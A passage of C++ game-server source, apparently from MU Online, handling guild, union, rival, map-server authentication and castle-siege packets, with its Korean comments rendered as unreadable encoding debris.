		else if( aRecv->btGuildStatus==G_PERSON )
		{
			GDGuildReqAssignStatus( aIndex, aRecv->btType, aRecv->szTagetName, aRecv->btGuildStatus );
			return;
		}
	}
	// ����
	else if( aRecv->btType == 0x03 )
	{
		GDGuildReqAssignStatus( aIndex, aRecv->btType, aRecv->szTagetName, aRecv->btGuildStatus );
	}
#endif

}
	
#endif



#ifdef ADD_NEW_GUILD_02_20040922
// [0xE2] ��� Type ����
void CGGuildAssignType( LPPMSG_GUILD_ASSIGN_TYPE_REQ aRecv, int aIndex )
{
	if( gObjIsConnectedGP(aIndex) == FALSE ) 
	{
		LogAddTD("error-L2 : Index %s %d", __FILE__, __LINE__);
		return;
	}

	if(!CHECK_LIMIT(aIndex, MAX_OBJECT)) 
		return;

	LPOBJECTSTRUCT lpObj = &gObj[aIndex];
	
	PMSG_GUILD_ASSIGN_TYPE_RESULT pMsg = {0,};
	pMsg.h.set((LPBYTE)&pMsg, 0xE2, sizeof(pMsg));
	pMsg.btGuildType = aRecv->btGuildType;
	
	// 0 . > ��带 ������ �ִ��� �˻�
	if( lpObj->GuildNumber <= 0 || lpObj->lpGuild == NULL )
	{
		pMsg.btResult = GUILD_ANS_NOTEXIST_GUILD;
		DataSend( aIndex, (LPBYTE)&pMsg, sizeof(pMsg) );

		return;
	}

	// 1 . > ������ �� �ִ� '����'�� ������ �ִ°�?
	if( gObj[aIndex].GuildStatus != G_MASTER )
	{
		pMsg.btResult = GUILD_ANS_NOTEXIST_PERMISSION;
		DataSend( aIndex, (LPBYTE)&pMsg, sizeof(pMsg) );
		
		return;
	}

	GDGuildReqAssignType( aIndex, aRecv->btGuildType );
}
	
#endif


#ifdef ADD_NEW_UNION_01_20041006

// CD[0xE5], DC[0xE5] Union, Rival ���� �α�/���� 
// ( [CD]����α�/���� ��û ����, [DC]��뿡�� ���� ��û )
void CGRelationShipReqJoinBreakOff( LPPMSG_RELATIONSHIP_JOIN_BREAKOFF_REQ aRecv, int aIndex )
{

#ifdef MU_CASTLESIEGE_SERVER_SYNC_20041130 // ������ �߿� ����, ���� ���� ���´�.
	if( g_CastleSiegeSync.GetCastleState() >= CASTLESIEGE_SYNC_STATE_NOTIFY 
		&& g_CastleSiegeSync.GetCastleState() <= CASTLESIEGE_SYNC_STATE_STARTSIEGE )
	{
		MsgOutput( aIndex, lMsg.Get(1732) ); // "������ǥ�Ⱓ-�����Ⱓ���� �Ұ����մϴ�."
		return;
	}
#endif
	
#ifdef MODIFY_ILLUSIONTEMPLE_BUGFIX_6_200708013		// ȯ����� �ȿ����� ���� ���� ���� ���´�. , wtf ���� ������Ʈ
	if(CHECK_ILLUSION_TEMPLE(gObj[aIndex].MapNumber))
	{
		MsgOutput( aIndex, lMsg.Get(3399));		// "ȯ����� �ȿ����� �Ұ����մϴ�."
		return;
	}
#endif

	INT iTargetUserIndex = MAKEWORD( aRecv->btTargetUserIndexL, aRecv->btTargetUserIndexH );
	
	if( !CHECK_LIMIT(aIndex, MAX_OBJECT) || !CHECK_LIMIT(iTargetUserIndex, MAX_OBJECT) ) 
		return;

	if( PacketCheckTime(&gObj[aIndex]) == FALSE ) return;

	// ����ڰ� �ִ��� �˻�.
	if( gObjIsConnected(&gObj[iTargetUserIndex]) == FALSE ) 
	{
		GCResultSend(aIndex, 0x51, 0x03);
		return;
	}

#ifdef UPDATE_REQUEST_OFF_ADD_RELATIONSHIP_20080219
	if( (gObj[iTargetUserIndex].m_Option&OPTION_TRADE) != OPTION_TRADE )
	{
		return;
	}
#endif	// UPDATE_REQUEST_OFF_ADD_RELATIONSHIP_20080219

#ifdef ADD_NEWPVP_PKFIELD
	if ( g_NewPVP.IsDuel(gObj[aIndex]) || g_NewPVP.IsDuel(gObj[iTargetUserIndex]))
	{
		// "�����߿��� ��忬��/������ ��û�� �� �� �����ϴ�."
		GCServerMsgStringSend(lMsg.Get(3431), aIndex, 1);
		return;
	}

	if (g_NewPVP.IsObserver(gObj[aIndex]) || g_NewPVP.IsObserver(gObj[iTargetUserIndex]))
	{
		// "�����߿��� ��忬��/������ ��û�� �� �� �����ϴ�."
		GCServerMsgStringSend(lMsg.Get(3432), aIndex, 1);
		return;
	}
#endif  // ADD_NEWPVP_PKFIELD

	// ���� ���� ��忡 ���ԵǾ� �ִ��� �˻�
	if( gObj[aIndex].lpGuild == NULL || gObj[iTargetUserIndex].lpGuild == NULL ) 
	{
		GCResultSend(aIndex, 0x51, 0x05);
		return;		
	}

	// ��� �����ͳ����� �� �� �ִ�.
	if( gObj[aIndex].GuildStatus != G_MASTER && gObj[iTargetUserIndex].GuildStatus != G_MASTER )
	{
		// ��û�� ����ڰ� ��帶���Ͱ� �ƴϴ�.
		GCResultSend(aIndex, 0x51, 0x04);	
		return;
	}
	
	// �ٸ� �������̽��� ����ϴ� ������ üũ
	if( gObj[aIndex].m_IfState.use > 0 ) 
	{
		GCResultSend(aIndex, 0x51, 0x06);
		return;
	}
		
	if( gObj[iTargetUserIndex].m_IfState.use > 0 ) 
	{
		GCResultSend(aIndex, 0x51, 0x06);
		return;
	}


	// Error Message 
	PMSG_RELATIONSHIP_JOIN_BREAKOFF_ANS ErrMsg = {0,};

	PHeadSetB((LPBYTE)&ErrMsg, 0xE6, sizeof( ErrMsg ));

	ErrMsg.btResult			  = 0x00;
	ErrMsg.btRequestType	  = aRecv->btRequestType;
	ErrMsg.btRelationShipType = aRecv->btRelationShipType;
	ErrMsg.btTargetUserIndexH = aRecv->btTargetUserIndexH;
	ErrMsg.btTargetUserIndexL = aRecv->btTargetUserIndexL;


	// �� ��� ��. ���踦 ���� �� �ִ� Status �ΰ�?
	LPOBJECTSTRUCT lpObj			= &gObj[aIndex];
	LPOBJECTSTRUCT lpTargetObj		= &gObj[iTargetUserIndex];

	if( lpObj->GuildStatus != G_MASTER 
		|| lpTargetObj->GuildStatus != G_MASTER )
	{
		// ��� �����Ͱ� �ƴϴ�.
		ErrMsg.btResult = GUILD_ANS_NOTEXIST_PERMISSION;
		DataSend(aIndex, (LPBYTE)&ErrMsg, ErrMsg.h.size);
		return;
	}

	// �� ���Ͽ��� ���� �� �ִ���, ���̹��� ���� �� �ִ��� �˻�.
	LPGUILD_INFO lpGuildInfo		= gObj[aIndex].lpGuild;
	LPGUILD_INFO lpTargetGuildInfo	= gObj[iTargetUserIndex].lpGuild;

	BYTE btRelationShip = gObjGetRelationShip( lpObj, lpTargetObj );

	if( aRecv->btRequestType == G_RELATION_OPERATION_JOIN )
	{
		if( aRecv->btRelationShipType == G_RELATIONSHIP_UNION )
		{

#ifndef FOR_NEW_TESTSERVER
			// #ifdef MIN_UNION_MASTER_GUILD_MEMBERCOUNT
			// ������ ����.
			if( lpTargetGuildInfo->Count < MIN_UNION_MASTER_GUILD_MEMBERCOUNT )
			{
				// ���Ͽ� ������ ����� �������� 20�� �̻��̾�� �Ѵ�.
				ErrMsg.btResult = GUILD_ANS_CANNOT_BE_UNION_MASTER;
				DataSend(aIndex, (LPBYTE)&ErrMsg, ErrMsg.h.size);
				return;
			}

			// #ifdef MIN_UNION_MASTER_GUILD_MEMBERCOUNT
			// ���� ������ 7���� �ִ��̴�.
			if( lpTargetGuildInfo->iGuildUnion != G_RELATIONSHIP_NONE 
				&& lpTargetGuildInfo->iGuildUnion == lpTargetGuildInfo->Number )
			{
				if( UnionManager.GetGuildRelationShipCount(lpTargetGuildInfo->iGuildUnion) >= MAX_UNION_MEMBER_COUNT )
				{	
					// ���� ������ 7���� �ִ� �̴�.
					ErrMsg.btResult = GUILD_ANS_EXCEED_MAX_UNION_MEMBER;
					DataSend(aIndex, (LPBYTE)&ErrMsg, ErrMsg.h.size);
					return;
				}
			}
#else
			if( lpTargetGuildInfo->iGuildUnion != G_RELATIONSHIP_NONE 
				&& lpTargetGuildInfo->iGuildUnion == lpTargetGuildInfo->Number )
			{
				if( UnionManager.GetGuildRelationShipCount(lpTargetGuildInfo->iGuildUnion) >= MAX_TESTSERVER_UNION_MEMBER_COUNT )
				{	
					// ���� ������ 7���� �ִ� �̴�.
					ErrMsg.btResult = GUILD_ANS_EXCEED_MAX_UNION_MEMBER;
					DataSend(aIndex, (LPBYTE)&ErrMsg, ErrMsg.h.size);
					return;
				}
			}
#endif

#ifdef MODIFY_UNION_JOIN_CASTLE_OWNER_GUILD_20050502
			// ���� ���� ���տ� �������� ���Ѵ�.
			char szCastleOwnerGuildName[MAX_GUILDNAMESTRING + 1 ] = { 0, };
			
			CopyMemory( szCastleOwnerGuildName, g_CastleSiegeSync.GetCastleOwnerGuild(), MAX_GUILDNAMESTRING );
			
			if( strcmp( lpGuildInfo->Name, szCastleOwnerGuildName ) == 0 )
			{
				// �̹� ���Ͽ¿� ���ԵǾ� �ִ�.
				ErrMsg.btResult = GUILD_ANS_EXIST_UNION;
				DataSend(aIndex, (LPBYTE)&ErrMsg, ErrMsg.h.size);
				return;
			}
#endif

			if( lpGuildInfo->iGuildUnion != G_RELATIONSHIP_NONE )
			{
				// �̹� ���Ͽ¿� ���ԵǾ� �ִ�.
				ErrMsg.btResult = GUILD_ANS_EXIST_UNION;
				DataSend(aIndex, (LPBYTE)&ErrMsg, ErrMsg.h.size);
				return;
			}

			if( btRelationShip == G_RELATIONSHIP_RIVAL )
			{
				// ���� ����� ���Ͽ��� �� �� ����.
				ErrMsg.btResult = GUILD_ANS_EXIST_RELATIONSHIP_RIVAL;
				DataSend(aIndex, (LPBYTE)&ErrMsg, ErrMsg.h.size);
				return;
			}

			if( lpTargetGuildInfo->iGuildUnion != G_RELATIONSHIP_NONE )
			{
				if( lpTargetGuildInfo->Number != lpTargetGuildInfo->iGuildUnion )
				{
					// ���� �����Ͱ� �ƴϴ�.
					ErrMsg.btResult = GUIDL_ANS_NOT_UNION_MASTER;
					DataSend(aIndex, (LPBYTE)&ErrMsg, ErrMsg.h.size);
					return;
				}
			}
		}
		else if( aRecv->btRelationShipType == G_RELATIONSHIP_RIVAL )
		{

			if( lpGuildInfo->iGuildRival != G_RELATIONSHIP_NONE 
				|| lpTargetGuildInfo->iGuildRival != G_RELATIONSHIP_NONE  )
			{
				// �̹� ���� ���¿� ����.
				ErrMsg.btResult = GUILD_ANS_EXIST_RIVAL;
				DataSend(aIndex, (LPBYTE)&ErrMsg, ErrMsg.h.size);
				return;
			}

			if( btRelationShip == G_RELATIONSHIP_UNION )
			{
				// ���� ���Ͽ��� ���� �� �� ����.
				ErrMsg.btResult = GUILD_ANS_EXIST_RELATIONSHIP_UNION;
				DataSend(aIndex, (LPBYTE)&ErrMsg, ErrMsg.h.size);
				return;
			}
			
		}
	}
	else if( aRecv->btRequestType == G_RELATION_OPERATION_BREAKOFF )
	{
		if( aRecv->btRelationShipType == G_RELATIONSHIP_UNION )
		{
			// ���Ͽ� ���� ����� �Ϲ����̴�.
			if( lpGuildInfo->iGuildUnion == G_RELATIONSHIP_NONE )
			{
				// ���Ͽ¿� ���� ���� �ʴ�.
				ErrMsg.btResult = GUILD_ANS_NOTEXIST_UNION;
				DataSend(aIndex, (LPBYTE)&ErrMsg, ErrMsg.h.size);
				return;
			}
			
		}
		else if( aRecv->btRelationShipType == G_RELATIONSHIP_RIVAL )
		{
			if( lpGuildInfo->iGuildRival==G_RELATIONSHIP_NONE 
				|| lpTargetGuildInfo->iGuildRival==G_RELATIONSHIP_NONE )
			{
				// ���� ���谡 ����.
				ErrMsg.btResult = GUILD_ANS_NOTEXIST_UNION;
				DataSend(aIndex, (LPBYTE)&ErrMsg, ErrMsg.h.size);
				return;
			}

			if( lpGuildInfo->iGuildRival != lpTargetGuildInfo->Number 
				|| lpGuildInfo->Number != lpTargetGuildInfo->iGuildRival )

			{
				// ���� ���� ��尡 �ƴ�.
				ErrMsg.btResult = GUILD_ANS_NOT_GUILD_RIVAL;
				DataSend(aIndex, (LPBYTE)&ErrMsg, ErrMsg.h.size);
				return;
			}
		}
	}
	
	// �� ���Ͽ� ���� ���� ���� ó��.
	if( aRecv->btRequestType == G_RELATION_OPERATION_BREAKOFF )
	{
		// ���Ͽ� ���� ����� �Ϲ����̱� ������ ���� ó���Ѵ�.
		if( aRecv->btRelationShipType == G_RELATIONSHIP_UNION )
		{
			GDUnionBreakOff( aIndex, lpGuildInfo->iGuildUnion );
			return;
		}
	}

	// �� �������̽� ���� ����
	lpObj->m_IfState.use			= 1;
	lpObj->m_IfState.type			= I_UNION;
	lpObj->m_IfState.state			= 0;
	lpObj->m_InterfaceTime			= GetTickCount();

	lpTargetObj->m_IfState.use		= 1;
	lpTargetObj->m_IfState.type		= I_UNION;
	lpTargetObj->m_IfState.state	= 0;
	lpTargetObj->m_InterfaceTime	= GetTickCount();

	// �� ���� �α� ���� ��û!
	PMSG_RELATIONSHIP_JOIN_BREAKOFF_REQ pMsg = {0,};
	
	PHeadSetB((LPBYTE)&pMsg, 0xE5, sizeof( pMsg ));
	
	pMsg.btTargetUserIndexL = LOBYTE( aIndex );
	pMsg.btTargetUserIndexH = HIBYTE( aIndex );
	
	pMsg.btRequestType		= aRecv->btRequestType;
	pMsg.btRelationShipType = aRecv->btRelationShipType;


	DataSend(iTargetUserIndex, (LPBYTE)&pMsg, pMsg.h.size);	
	
}

// DC[0xE6], CD[0xE6] Union, Rival ���� �α�/���� ���
// ( [CD]���� �α�/���� ���� ��û ����, [DC]��뿡�� ���� �α�/���� ���� ��û )
void CGRelationShipAnsJoinBreakOff( LPPMSG_RELATIONSHIP_JOIN_BREAKOFF_ANS aRecv, int aIndex )
{
	INT iTargetUserIndex = MAKEWORD( aRecv->btTargetUserIndexL, aRecv->btTargetUserIndexH );
	
	if( !CHECK_LIMIT(aIndex, MAX_OBJECT) || !CHECK_LIMIT(iTargetUserIndex, MAX_OBJECT) ) 
		return;

	if( PacketCheckTime(&gObj[aIndex]) == FALSE ) return;

	// ����ڰ� �ִ��� �˻�.
	if( gObjIsConnected(&gObj[iTargetUserIndex]) == FALSE ) 
	{
		GCResultSend(aIndex, 0x51, 0x03);
		return;
	}
	
	// OK �̸� 
	if( aRecv->btResult == 0x01 ) 
	{		
		//�� EX DB�� �ش� ��û ó��
		if( aRecv->btRequestType == G_RELATION_OPERATION_JOIN )
		{
			// �̹� 0xE5�� ���ļ� �Ա� ������ 
			// iTargetUserIndex : ó���� ��û�� ���.
			// aIndex : ��û ���� ��� Union ������
			GDRelationShipReqJoin( iTargetUserIndex, aIndex, aRecv->btRelationShipType );
		}
		else
		if( aRecv->btRequestType == G_RELATION_OPERATION_BREAKOFF )
		{
			GDRelationShipReqBreakOff( aIndex, iTargetUserIndex, aRecv->btRelationShipType );
		}

	}
	else
	{
		// Error Message 
		PMSG_RELATIONSHIP_JOIN_BREAKOFF_ANS ErrMsg = {0,};
		
		PHeadSetB((LPBYTE)&ErrMsg, 0xE6, sizeof( ErrMsg ));
		
		ErrMsg.btResult			  = 0x00;
		ErrMsg.btRequestType	  = aRecv->btRequestType;
		ErrMsg.btRelationShipType = aRecv->btRelationShipType;
		ErrMsg.btTargetUserIndexH = aRecv->btTargetUserIndexH;
		ErrMsg.btTargetUserIndexL = aRecv->btTargetUserIndexL;

		// ��û�� ��� �Ǿ����ϴ�.
		ErrMsg.btResult = GUILD_ANS_CANCLE_REQUEST;
		DataSend(iTargetUserIndex, (LPBYTE)&ErrMsg, ErrMsg.h.size);

//		GCResultSend(iTargetUserIndex, 0x51, 0x00);
	}

	// �������̽� ���� �ʱ�ȭ
	if(gObj[aIndex].m_IfState.use && gObj[aIndex].m_IfState.type == I_UNION )
	{
		gObj[aIndex].m_IfState.use = 0;
	}
	
	if(gObj[iTargetUserIndex].m_IfState.use && gObj[iTargetUserIndex].m_IfState.type == I_UNION )
	{
		gObj[iTargetUserIndex].m_IfState.use = 0;
	}
	
}

void CGUnionList( LPPMSG_UNIONLIST_REQ aRecv, int aIndex )
{
	if( !CHECK_LIMIT(aIndex, MAX_OBJECT) ) 
		return;
	
	if( PacketCheckTime(&gObj[aIndex]) == FALSE ) return;

	LPOBJECTSTRUCT lpObj = &gObj[aIndex];

	if( lpObj == NULL )
		return;
	
	// ����ڰ� �ִ��� �˻�.
	if( gObjIsConnected(&gObj[aIndex]) == FALSE ) 
	{
		GCResultSend(aIndex, 0x51, 0x03);
		return;
	}

	// ��� 
	if( lpObj->lpGuild == NULL )
	{
		GCResultSend(aIndex, 0x51, 0x03);
		return;
	}

	// ������ �ִ°�?
	if( lpObj->lpGuild->iGuildUnion == G_RELATIONSHIP_NONE )
	{
		GCResultSend(aIndex, 0x51, 0x03);
		return;
	}

	GDUnionListSend( aIndex, lpObj->lpGuild->iGuildUnion );
}
#endif


#ifdef ADD_ABILITY_OF_UNIONMASTER_TO_KICK_OUT_UNIONMEMBER_01_20050418

// CD[0xEB][0x01], DC[0xEB][0x01] ���ո����Ͱ� ������ ���ո���� Ż���Ų��.
void CGRelationShipReqKickOutUnionMember( LPPMSG_KICKOUT_UNIONMEMBER_REQ aRecv, int aIndex )
{
	if( !CHECK_LIMIT(aIndex, MAX_OBJECT) ) 
		return;
	
	if( PacketCheckTime(&gObj[aIndex]) == FALSE ) return;

	LPOBJECTSTRUCT lpObj = &gObj[aIndex];

	if( lpObj == NULL )
		return;

	// ����ڰ� �ִ��� �˻�.
	if( gObjIsConnected(&gObj[aIndex]) == FALSE ) 
	{
		GCResultSend(aIndex, 0x51, 0x03);
		MsgOutput( aIndex, "�� Terminated User.");
		return;
	}

	// ��� 
	if( lpObj->lpGuild == NULL )
	{
		GCResultSend(aIndex, 0x51, 0x03);
		MsgOutput( aIndex, "�� Terminated Guild.");
		return;
	}

	// Error Message 
	PMSG_RELATIONSHIP_JOIN_BREAKOFF_ANS ErrMsg = {0,};

	PHeadSetB((LPBYTE)&ErrMsg, 0xE6, sizeof( ErrMsg ));

	ErrMsg.btResult			  = 0x00;
	ErrMsg.btRequestType	  = G_RELATION_OPERATION_BREAKOFF;
	ErrMsg.btRelationShipType = G_RELATIONSHIP_UNION;
	ErrMsg.btTargetUserIndexH = 0;
	ErrMsg.btTargetUserIndexL = 0;


	// 1. ������ �ִ°�?
	if( lpObj->lpGuild->iGuildUnion == G_RELATIONSHIP_NONE )
	{
		ErrMsg.btResult = GUILD_ANS_NOTEXIST_UNION;
		DataSend(aIndex, (LPBYTE)&ErrMsg, ErrMsg.h.size);
		return;
	}

	if( lpObj->GuildStatus != G_MASTER 
		|| lpObj->lpGuild->Number != lpObj->lpGuild->iGuildUnion )
	{
		// 2. ��� �����Ͱ� �ƴϴ�. ���� �����Ͱ� �ƴϴ�.
		ErrMsg.btResult = GUILD_ANS_NOTEXIST_PERMISSION;
		DataSend(aIndex, (LPBYTE)&ErrMsg, ErrMsg.h.size);
		return;
	}

	char szUnionMemberGuildName[MAX_GUILDNAMESTRING+1] = {0,};
	
	CopyMemory( szUnionMemberGuildName, aRecv->szTargetGuildName, MAX_GUILDNAMESTRING );

	// 3. Ż���Ű���� ����� ���ո����� ������ ����.
	if( strcmp( lpObj->lpGuild->Name, szUnionMemberGuildName ) == 0 )
	{
		ErrMsg.btResult = GUILD_ANS_NOTEXIST_PERMISSION;
		DataSend(aIndex, (LPBYTE)&ErrMsg, ErrMsg.h.size);
		return;
	}

	GDRelationShipReqKickOutUnionMember( aIndex, szUnionMemberGuildName );
}
#endif


#ifdef MAP_SERVER_WORK_20041030		// ���� �ʺ��� ���� ��Ŷ - ���Ӽ��� <-> Ŭ���̾�Ʈ

//----------------------------------------------------------------------------
// CG [0xB1][0x01] �ʼ��� �̵� �� �߰����� ����, ���ӿ�û (0xC3)
//----------------------------------------------------------------------------
void CGReqMapSvrAuth			(LPPMSG_REQ_MAPSERVERAUTH lpMsg, INT iIndex)
{
	//------------------------------------------------------------------------
	// �⺻�� ���� ���� ������ ���� ���� [0xF1][0X01]
	BYTE btSerial[17];
	char id[MAX_IDSTRING+1];

	// ���� ���� üũ
	if( (lpMsg->btCliVersion[0] != szClientVersion[0]) ||
		(lpMsg->btCliVersion[1] != szClientVersion[1]) ||
		(lpMsg->btCliVersion[2] != szClientVersion[2]) ||
		(lpMsg->btCliVersion[3] != szClientVersion[3]) ||
		(lpMsg->btCliVersion[4] != szClientVersion[4]) )
	{
		GCAnsMapSvrAuth(iIndex, 0x06);
		CloseClient ( iIndex );
		return;
	}

	btSerial[16] = '\0';
	memcpy(btSerial, lpMsg->btCliSerial, 16);

	id[MAX_IDSTRING] = '\0';
	memcpy(id, lpMsg->szAccountID, MAX_IDSTRING);
	BuxConvert(id, MAX_IDSTRING);
	
#if ( LOCALCONNECT == 0 )
	// ���� ���� �ø��� ��ȣ�� �´��� üũ
	if( strcmp((char*)btSerial, szGameServerExeSerial) != 0 )
	{		
		LogAddC(LOGC_RED,"error-L1: Serial error [%s] [%s]", id, btSerial);
		GCAnsMapSvrAuth(iIndex, 0x06);
		CloseClient ( iIndex );
		return;
	}
#endif

	if( bCanConnectMember == 1 )
	{
		if( ConMember.IsMember(id) == FALSE )
		{
			GCAnsMapSvrAuth(iIndex, 0x02);
			return;
		}
	}

	LPOBJECTSTRUCT	lpObj = &gObj[iIndex];
	if( PacketCheckTime(lpObj) == FALSE ) // �ð��� �ʰ��Ǿ���..
	{
		LogAdd(lMsg.Get(473), iIndex, id);
		CloseClient ( iIndex );
		return;
	}
	if( gObj[iIndex].Connected != CSS_LOGIN ) 
	{
		LogAdd(lMsg.Get(474), iIndex, id);
		CloseClient ( iIndex );
		return;
	}
	if( gObj[iIndex].LoginMsgSnd != 0 )
	{
		if( gObj[iIndex].LoginMsgSnd == 1 )
		{
			LogAdd(lMsg.Get(475), iIndex, id, gObj[iIndex].Ip_addr);
		}
		else {
			LogAdd("error : %d %s %d",gObj[iIndex].LoginMsgSnd, __FILE__, __LINE__);
		}
		return;
	}
	
//	SDHP_IDPASS	spMsg;
//	PHeadSetB((LPBYTE)&spMsg, 0x01, sizeof( spMsg ));
//	spMsg.Number     = iIndex;
//	memcpy(spMsg.Id,   lpMsg->Id,   MAX_IDSTRING);
//	memcpy(spMsg.Pass, lpMsg->Pass, MAX_IDSTRING);
//	
//	strcpy(spMsg.IpAddress, gObj[iIndex].Ip_addr);


#if (TESTSERVER==1)
	// ���� �׽�Ʈ�� �� ������ IP�� �Ҵ��ؾ� �� ��쿡�� ����Ѵ�.
	//strcpy(spMsg.IpAddress, "61.35.132.2");
#endif
	
	gObj[iIndex].CheckTick				= lpMsg->iTickCount;
	gObj[iIndex].CheckTick2				= GetTickCount();
	gObj[iIndex].ConnectCheckTime		= GetTickCount();
	gObj[iIndex].CheckSpeedHack			= 1;
	gObj[iIndex].ConnectCheckTime 		= GetTickCount();
	gObj[iIndex].LoginMsgSnd			= 1;
	gObj[iIndex].LoginMsgCount++;
	gObj[iIndex].AccountID[MAX_IDSTRING] = '\0';
	memcpy(gObj[iIndex].AccountID, id, MAX_IDSTRING);
//	gObj[iIndex].Name[MAX_IDSTRING] = '\0';
//	memcpy(gObj[iIndex].Name, lpMsg->szCharName, MAX_IDSTRING);
	memset(gObj[iIndex].Name, 0, MAX_IDSTRING);

	gObj[iIndex].m_cAccountItemBlock	= FALSE;

#ifdef FOR_THAILAND	
	gObj[iIndex].m_AuthAdult = 0;
	gObj[iIndex].m_DisplayTeenLogOutMsg = FALSE;
#endif
	
#ifdef CHN_PLAYTIME_LIMIT_SYSTEM_20050818
	gObj[iIndex].m_iPlayTimeLimit		= 0;
	gObj[iIndex].m_dwPlayTick			= GetTickCount();
	gObj[iIndex].m_iPlayNoticeTick		= 0;
#endif

#ifdef VTM_PLAYTIME_LIMIT_SYSTEM_20060626
	gObj[iIndex].m_iPlayTimeLimit		= 0;
	gObj[iIndex].m_iPlayRestTime		= 0;
	gObj[iIndex].m_dwPlayTick			= GetTickCount();
	gObj[iIndex].m_iPlayNoticeTick		= 0;
#endif

#ifdef ADD_PROTOCOL_PCBANG_GUID	
	gObj[iIndex].PcBangGuid = 0;
#endif

//	wsJServerCli.DataSend((char*)&spMsg, spMsg.h.size);
//	LogAddTD("join send : (%d)%s", iIndex, gObj[iIndex].AccountID);
	//------------------------------------------------------------------------

	// ���������� �ʼ��� ���� ��û�� �Ѵ�.
	GJReqMapSvrAuth (
		iIndex, 
		gObj[iIndex].AccountID,
		lpMsg->szCharName,
		lpMsg->iJoinAuthCode1, 
		lpMsg->iJoinAuthCode2,
		lpMsg->iJoinAuthCode3,
		lpMsg->iJoinAuthCode4
		);	
	LogAddTD("[MapServerMng] Map Server Join Send : [%s][%s](%d)",
		gObj[iIndex].AccountID,
		gObj[iIndex].Name,
		iIndex
		);
}


//----------------------------------------------------------------------------
// GC [0xB1][0x01] �ʼ��� �̵� �� �߰����� ����, ���ӿ�û ��� (0xC1)
//----------------------------------------------------------------------------
void GCAnsMapSvrAuth			(INT iIndex, INT iResult)
{
	if (!CHECK_LIMIT(iIndex, MAX_OBJECT)) {
		LogAddC(LOGC_RED, "[MapServerMng] Packet Error JG [0x7B] - Index out of bound : %d",
			iIndex
			);
		return;
	}

	PMSG_ANS_MAPSERVERAUTH	pMsgResult;
	PHeadSubSetB((LPBYTE)&pMsgResult, 0xB1, 0x01, sizeof(pMsgResult));
	pMsgResult.iResult	= iResult;
	DataSend(iIndex, (LPBYTE)&pMsgResult, pMsgResult.h.size);
}

#endif

#ifdef MU_CASTLESIEGE_CL_PROTOCOL_20041122	// �� ������ - �� Ŭ���̾�Ʈ ���� �������� ó�� �Լ� ����

#include "CastleSiege.h"
#include "MapServerManager.h"


//----------------------------------------------------------------------------
// CG [0xB2][0x00] Ŭ���̾�Ʈ�� ������ ���������� ��û
//----------------------------------------------------------------------------
void CGReqCastleSiegeState		(LPPMSG_REQ_CASTLESIEGESTATE lpMsg, INT iIndex)
{
#ifdef CASTLE_MAIN_SCHEDULER_20041111

	// [0x80][0x01] ������ ����� �渶�̸� ��û -> ��� NPC �� ���� ���
	GS_GDReqOwnerGuildMaster (g_MapServerManager.GetMapSvrGroup(), iIndex);

#endif
}


//----------------------------------------------------------------------------
// GC [0xB2][0x00] Ŭ���̾�Ʈ�� ������ ���������� ��û ����
//----------------------------------------------------------------------------
void GCAnsCastleSiegeState		(INT iIndex, INT iResult, LPSTR lpszGuildName,  LPSTR lpszGuildMaster)
{
#ifdef CASTLE_MAIN_SCHEDULER_20041111

	if (!lpszGuildName || !lpszGuildMaster)
		return;	

	PMSG_ANS_CASTLESIEGESTATE pMsgResult;
	pMsgResult.h.set((LPBYTE)&pMsgResult, 0xB2, 0x00, sizeof(PMSG_ANS_CASTLESIEGESTATE));
	pMsgResult.btResult				= iResult;

	memcpy(pMsgResult.cOwnerGuild, lpszGuildName, 8);
	memcpy(pMsgResult.cOwnerGuildMaster, lpszGuildMaster, 10);
	
	// ���� ���� ���¿� ������ �Ⱓ (����/����) �� ���Ѵ�.
	SYSTEMTIME tmStateStartDate		= {0,};
	SYSTEMTIME tmStateEndDate		= {0,};
	SYSTEMTIME tmSiegeStartDate		= {0,};
	INT iCastleState				= g_CastleSiege.GetCastleState();
	BOOL bRETVAL					= g_CastleSiege.GetCastleStateTerm(tmStateStartDate, tmStateEndDate);
	tmSiegeStartDate				= g_CastleSiege.GetCastleLeftSiegeDate();
	if (!bRETVAL) {
		// ������ ���� �Ⱓ�� ���� �� ����.
		iCastleState				= CASTLESIEGE_STATE_NONE;
	}

#ifdef MU_CASTLESIEGE_STATE_SEC_VIEW_20050413
	INT	iStateLeftSec				= g_CastleSiege.GetCurRemainSec();
#endif
	
	pMsgResult.cCastleSiegeState	= iCastleState;
	pMsgResult.btStartYearH			= HIBYTE(tmStateStartDate.wYear);
	pMsgResult.btStartYearL			= LOBYTE(tmStateStartDate.wYear);
	pMsgResult.btStartMonth			= tmStateStartDate.wMonth;
	pMsgResult.btStartDay			= tmStateStartDate.wDay;
	pMsgResult.btStartHour			= tmStateStartDate.wHour;
	pMsgResult.btStartMinute		= tmStateStartDate.wMinute;
	pMsgResult.btEndYearH			= HIBYTE(tmStateEndDate.wYear);
	pMsgResult.btEndYearL			= LOBYTE(tmStateEndDate.wYear);
	pMsgResult.btEndMonth			= tmStateEndDate.wMonth;
	pMsgResult.btEndDay				= tmStateEndDate.wDay;
	pMsgResult.btEndHour			= tmStateEndDate.wHour;
	pMsgResult.btEndMinute			= tmStateEndDate.wMinute;
	pMsgResult.btSiegeStartYearH	= HIBYTE(tmSiegeStartDate.wYear);
	pMsgResult.btSiegeStartYearL	= LOBYTE(tmSiegeStartDate.wYear);
	pMsgResult.btSiegeStartMonth	= tmSiegeStartDate.wMonth;
	pMsgResult.btSiegeStartDay		= tmSiegeStartDate.wDay;
	pMsgResult.btSiegeStartHour		= tmSiegeStartDate.wHour;
	pMsgResult.btSiegeStartMinute	= tmSiegeStartDate.wMinute;

#ifdef MU_CASTLESIEGE_STATE_SEC_VIEW_20050413
	pMsgResult.btStateLeftSec1		= HIBYTE(HIWORD(iStateLeftSec));
	pMsgResult.btStateLeftSec2		= LOBYTE(HIWORD(iStateLeftSec));
	pMsgResult.btStateLeftSec3		= HIBYTE(LOWORD(iStateLeftSec));
	pMsgResult.btStateLeftSec4		= LOBYTE(LOWORD(iStateLeftSec));
#endif

	DataSend(iIndex, (LPBYTE)&pMsgResult, pMsgResult.h.size);

#endif
}


//----------------------------------------------------------------------------
// CG [0xB2][0x01] ������ ����� ��û
//----------------------------------------------------------------------------
void CGReqRegCastleSiege		(LPPMSG_REQ_REGCASTLESIEGE lpMsg, INT iIndex)
{
#ifdef CASTLE_MAIN_SCHEDULER_20041111

	// 1> . ���簡 ��� ������ �ð����� Ȯ��
	if (g_CastleSiege.GetCastleState() != CASTLESIEGE_STATE_REGSIEGE) {
		// ��� ������ �ð��� �ƴ�
		GCAnsRegCastleSiege (iIndex, 7, "");
		return;
	}

